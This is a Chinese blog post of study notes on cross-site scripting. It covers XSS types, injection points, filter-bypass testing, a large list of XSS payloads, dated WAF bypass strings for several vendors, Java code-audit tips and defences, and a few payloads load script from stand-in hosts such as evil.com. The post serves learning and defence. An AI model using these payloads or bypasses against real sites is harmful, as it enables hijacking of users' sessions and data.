# XSS漏洞


> 由于时间和篇幅，只做浅析，往后时间充裕了再细细研究



## 简介

XSS（cross site scripting）跨站脚本为了不与网页中层叠样式表（css）混淆，故命名为xss。黑客将恶意代码嵌入网页中，当客户网文网页的时候，网页中的脚本会自动执行，从而达成黑客攻击的目的。



## 分类

### 1.反射型xss

非持久化，一般需要欺骗客户去点击构造好的链接才能触发代码。



### 2.存储型XSS

他会存储到数据库中，这种xss漏洞危害极大，因为它可以长久的保存在网页中，每个浏览过此网页的用户都会中招，很多xss蠕虫的爆发都是基于持久型xss，一般在留言板，评论区类位置容易出现此漏洞。但存储型XSS不用考虑绕过浏览器的过滤问题，屏蔽性也要好很多。

![存储型XSS攻击流程](https://image.geoer.cn/img/image-20220118223432836.png)



### 3.DOM型XSS

全称Document Object Model，使用DOM可以使程序和脚本能够动态访问更新文档的内容，结构及样式。
DOM型XSS是一种特殊类型的反射型XSS，基于DOM文档对象模型的一种漏洞。







## 挖掘

**XSS可以插在哪里？** 

用户输入作为script标签内容

```java
//<script>标签：script是最有直接的xss攻击载荷，脚本标记可以应用外部的js代码，或者将脚本插入网页之中。

<script>alert("hhh")</script>

<script src="http://1.1.1.1/a.js"></script>
```



用户输入作为HTML注释内容



用户输入作为HTML标签的属性名



用户输入作为HTML标签的属性值

```javascript
//<img >标签：

<img src="2" onerror=alert('hhh')>
<img src="2" onerror=alert(/hhh/)>
<img src="javascript:alert("XSS");">
<img dynsrc="javascript:alert('XSS')">
<img lowsrc="javascript:alert('XSS')">
　　
    
//<table>标签：
<table background="javascript::alert('hhh')">

    
//<iframe>标签：<iframe>标签允许另一个HTML网页的嵌入到父页面。IFrame可以包含JavaScript，但是，请注意，由于浏览器的内容安全策略（CSP），iFrame中的JavaScript无法访问父页面的DOM。然而，IFrame仍然是非常有效的解除网络钓鱼攻击的手段。

<iframe src=”http://evil.com/xss.html”>
```



用户输入作为HTML标签的名字



直接插入到CSS里　





### 测试思路

下面让我们来看一下XSS绕过的测试流程。

现实中，大多数的场所是用的黑名单来做XSS过滤器的，有三种方式绕过黑名单的测试：

1.暴力测试（输入大量的payload，看返回结果）
2.根据正则推算
3.利用浏览器bug
初步测试

（1）尝试插入比较正常的HTML标签，例如：`<a>、<b>、<i>、<u>`等，来看一下返回页面的情况是怎样的，是否被HTML编码了，或者标签被过滤了。

（2）尝试插入不闭合的标签，例如：<a、<b、i>、u>、<img等，然后看一下返回响应，是否对开放的标签也有过滤。

（3）然后测试几种常见的XSS向量：

```
<script>alert(1)</script><script>prompt(1)</script><script>confirm(1)</script>......看返回响应，是过滤的全部，还是只过滤了部分，是否还留下了alert、prompt、confirm等字符，再尝试大小写的组合：
<scRiPt>alert(1);</scrIPt>

```



（4）如果过滤器仅仅是把`<script>`和`</script>`标签过滤掉，那么可以用双写的方式来绕过：

```bash
<scr<script>ipt>alert(1)</scr<script>ipt>
```

这样当<script>标签被过滤掉后，剩下的组合起来刚好形成一个完整的向量。

（5）用<ahref标签来测试，看返回响应

```bash
<ahref="http://www.baidu.com">click</a>

```



看看<a标签是否被过滤，href是否被过滤，href里的数据是否被过滤了。如果没有数据被过滤，插入javascript伪协议看看：

```bash
<ahref="javascript:alert(1)">click</a>
```

看是否返回错误，javascript的整个协议内容是否都被过滤掉，还是只过滤了javascript字符。

继续测试事件触发执行javascript：

```bash
<ahref=xonmouseover=alert(1)>ClickHere</a>

```

看onmouseover事件是否被过滤。

测试一个无效的事件，看看他的过滤规则：

```bash
<ahref=xonclimbatree=alert(1)>ClickHere</a>

```

是完整的返回了呢，还是跟onmouseover一样被干掉了。如果是完整的返回的话，那么就意味着，做了事件的黑名单，但是在HTML5中，有超过150种的方式来执行javascript代码的事件，我们可以选用别的事件。测试一个很少见的事件：

```bash
<bodyonhashchange=alert(1)><ahref=#>click</a>

```

onhashchange事件在当前URL的锚部分(以'#'号为开始)发生改变时触发。





### 常用Payload

```bash
#Basic payload
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>

#Img payload
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>

#Svg payload
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)


#HTML5中的一些XSS
<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>

<body ontouchstart=alert(1)> // 当手指触摸屏幕时触发
<body ontouchend=alert(1)>   // 当手指从屏幕中移走时触发
<body ontouchmove=alert(1)>  // 当手指在屏幕中拖动时触发XSS使用Script标签（外部Payload）
```







scirpt标签用于定义客户端脚本，比如JavaScript

```

<script>alert(1);</script>

<script>alert("xss");</script>
```



img标签定义HTML页面中的图像

```
<img src=1onerror=alert(1);>

<img src=1onerror=alert("xss");>
```



input标签规定了用户可以在其中输入数据的输入字段

```
<input onfocus=alert(1);>
 onfocus="alert(1);"autofocus>
```


details标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle事件规定了在用户打开或关闭<details>元素时触发：

```
<details ontoggle=alert(1);>

<details openontoggle=alert(1);>
```




svg标签用来在HTML页面中直接嵌入SVG文件的代码

```
<svg onload=alert(1);>
```




select标签用来创建下拉列表

```
<select onfocus=alert(1)></select>

<select onfocus=alert(1)autofocus>
```




iframe标签创建包含另外一个文档的内联框架

```
<iframe onload=alert(1);></iframe>
```




video标签定义视频，比如电影片段或其他视频流。

```
<video><source onerror=alert(1)>
```




audio标签定义声音，比如音乐或其他音频流。

```
<audio src=xonerror=alert(1);>
```




body标签定义文档的主体

```
<body onload=alert(1);>
```



onscroll事件在元素滚动条在滚动时触发。我们可以利用换行符以及autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发：

```
<body
onscroll=alert(1);><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><inputautofocus>
```




textarea标签定义一个多行的文本输入控件。

```
<textarea onfocus=alert(1);autofocus>
```



 

marquee标签

```
<marquee onstart=alert(1)></marquee>//Chrome不行，火狐和IE都可以

```

isindex标签

```
<isindex type=image src=1onerror=alert(1)>//仅限于IE
```

利用link远程包含JavaScript文件

<link>标签定义文档与外部资源的关系。在无CSP的情况下才可以使用：

```
<link rel=import href="http://47.xxx.xxx.72/evil.js">
```




利用JavaScript伪协议

javascript:这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。当浏览器装载了这样的URL时，并不会转向某个URL，而是执行这个URL中包含的javascript代码，并把最后一条javascript语句的字符串值作为新文档的内容显示出来。

a标签

```
<a href="javascript:alert(1);">xss</a>
```



iframe标签

```
<iframe src=javascript:alert(1);></iframe>
```

img标签

```
<img src=xonerror=alert(1)>

<img src=javascript:alert(1)>//IE7以下
```

form标签

```
<form action="Javascript:alert(1)"><input type=submit>
```







### 常见编码

**1.js编码**
js提供了四种字符编码的策略
三位八进制数字，如果个数不够，在前面补0，例如"e"的编码为"\145"
两位十六进制数字，如果个数不够，在前面补0，例如"e"的编码为"\x65"
四位十六进制数字，如果个数不够，在前面补0，例如"e"的编码为"\u0065"
对于一些控制字符，使用特殊的C类型的转义风格(例如\n和\r)

**2.html实体编码**
命名实体：以&开头，以分号结尾
字符编码：十进制，十六进制ASCII码或者Unicode字符编码

**2.url编码**

使用XSS编码测试时需要考虑html渲染的顺序，针对多种编码的组合时，要选择合适的编码进行测试





### 常见bypass

> 可以参考法克论坛的pdf

#### 过滤的绕过

```javascript
大小写绕过
	- 绕过标签黑名单
	- 用代码评估绕过单词黑名单
	- 不完整的HTML标签绕过
	- 绕过字符串的引号
	- 绕过Script标签的引号
	- 在mousedown事件中绕过引号
	- 绕过点（.）的限制
	- 绕过字符串的括号
	- 绕过括号和分号
	- 绕过 onxxxx= 黑名单
	- 绕过空格过滤
	- Bypass email filter
	- 绕过文档黑名单
	- 在字符串中使用javascript绕过
	- 使用其他方式绕过重定向限制
	- 使用其他方式执行alert
	- 不使用任何东西绕过 ">"
	- 使用其他字符绕过 ";"
	- 使用HTML编码绕过
	- 使用Katana绕过
	- 使用Lontara绕过
	- 使用ECMAScript6绕过
	- 使用八进制编码绕过
	- 使用Unicode编码绕过
	- 使用UTF-7编码绕过
	- 使用UTF-8编码绕过
	- 使用UTF-16be编码绕过
	- 使用UTF-32编码绕过
	- 使用BOM（浏览器对象模型）绕过
	- 使用奇怪的编码绕过
```



#### 过狗

> 发现了个好资源，直接借鉴的，推荐去学学
>
> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

Cloudflare XSS Bypasses

25st January 2021

```
<svg/onrandom=random onload=confirm(1)>
<video onnull=null onmouseover=confirm(1)>
```

21st April 2020

```
<svg/OnLoad="`${prompt``}`">
```

22nd August 2019

```
<svg/onload=%26nbsp;alert`bohdan`+
```

5th June 2019

```
1'"><img/src/onerror=.1|alert``>
```

3rd June 2019

```
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
```

Cloudflare XSS Bypass - 22nd March 2019 (by @RakeshMane10)

```
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
```

Cloudflare XSS Bypass - 27th February 2018

```
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
```

Chrome Auditor - 9th August 2018

```
</script><svg><script>alert(1)-%26apos%3B
```

Live example by @brutelogic - [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?c1=alert(1)-%26apos%3B)

Incapsula WAF Bypass by [@Alra3ees](https://twitter.com/Alra3ees/status/971847839931338752)- 8th March 2018

```
anythinglr00</script><script>alert(document.domain)</script>uxldz

anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
```

Incapsula WAF Bypass by [@c0d3G33k](https://twitter.com/c0d3G33k) - 11th September 2018

```
<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
```

Incapsula WAF Bypass by [@daveysec](https://twitter.com/daveysec/status/1126999990658670593) - 11th May 2019

```
<svg onload\r\n=$.globalEval("al"+"ert()");>
```

Akamai WAF Bypass by [@zseano](https://twitter.com/zseano) - 18th June 2018

```
?"></script><base%20c%3D=href%3Dhttps:\mysite>
```

Akamai WAF Bypass by [@s0md3v](https://twitter.com/s0md3v/status/1056447131362324480) - 28th October 2018

```
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
```

WordFence WAF Bypass by [@brutelogic](https://twitter.com/brutelogic) - 12th September 2018

```
<a href=javas&#99;ript:alert(1)>
```

Fortiweb WAF Bypass by [@rezaduty](https://twitter.com/rezaduty) - 9th July 2019

```
\u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
```





### 练习平台

靶场：xss-labs





### 工具

- xss平台
- beef



## Java代码审计

一种审计策略：

1.收集输入、输出点

2.查看输入、输出点的上下文环境

3.判断Web应用是否对输入、输出环境做了防御工作





### XSS常见触发位置

**输入**在Java中常用`request.getParameter(param)`或`${param}`获取用户的输入信息；

**输出**主要表现为前端的渲染，我们可以定位前端中的一些常见的标识符来找到他们，然后根据后端逻辑来判断漏洞是否存在。

**1.JSP表达式**

`<%=变量%>`是`<%out.println(变量);%>`的简写方式，`<%=%>`用于将已声明的变量或表达式输出到外网页中

```jsp

```



**2.EL（表达式语言）**

是为了使jsp写起来更加简单。

例如：`<%=request.getParameter("username")%>`等价于`${param.username}`

```jsp
<c:out> 标签
    
<c:if> 标签
    
<c:forEach> 标签
```



**3.ModelAndView类的使用**

ModelAndView用来存储处理完成后的结果数据，以及显示该数据的视图，其前端JSP页面可以使用`${参数}`的方法来获取值



**4.ModelMap类的使用**

可以根据模型属性的具体类型自动生成模型属性的名称



**5.Model类的使用**





### 对于反射型XSS

白盒审计中，需要寻找带有参数的输出方法，然后对输出方法对输出内容回溯输入参数





### 对于存储型XSS

要统一寻找“输出点”和“输出点”。由于输出点与输入点可能不在一个业务流中，可以考虑以下方法提高效率：

1.黑白盒结合

2.通过功能、接口名、表名、字段名等角度做搜索



寻找输入点

审计输入点代码

对输出点进行审计





### 对于Dom型XSS

dom型xss不需要与服务器交互，它只发生在客户端处理数据阶段。

粗略说，Dom型xss的成因是不可控的危险数据，未经过滤传入存在缺陷的js代码处理。



**Dom型XSS常见的输入输出点：**

| 输入点            | 输出点             |
| ----------------- | ------------------ |
| document.URL      | eval               |
| document.location | document.write     |
| document.referer  | document.InnerHTML |
| document.form     | document.OuterHTML |
|                   |                    |







### 关键字

```bash
<%=
${
<c:out
<c:if
<c:forEach
ModelAndView
ModelMap
Model
request.getParameter
request.setAttibute
request.getWriter().print()
request.getWriter().writer()

```









## 漏洞防御

- 对与后端有交互的位置执行参数的输入过滤（课通过Java的filter、Spring参数校验注解来实现。比如编写全局过滤器实现拦截并在web.xml中进行配置）
- 对与后端有交互的位置执行参数的输出转义/html编码等
- 开启JS开发框架的XSS防护功能
- 设置HttpOnly（严格的说，HttpOnly对防御XSS不起作用，主要是为了解决xss漏洞后续的cookie劫持攻击，可以阻止客户端脚本访问cookie）
- 采用OWASP企业安全程序接口(ESAPI)实现，类似内容还有谷歌的xssProtect等





## 参考

https://www.cnblogs.com/xyz315/p/14850359.html

https://cloud.tencent.com/developer/article/1474865

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-wrappers-javascript-and-data-uri





未完待续...


---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/xss%E6%BC%8F%E6%B4%9E/  

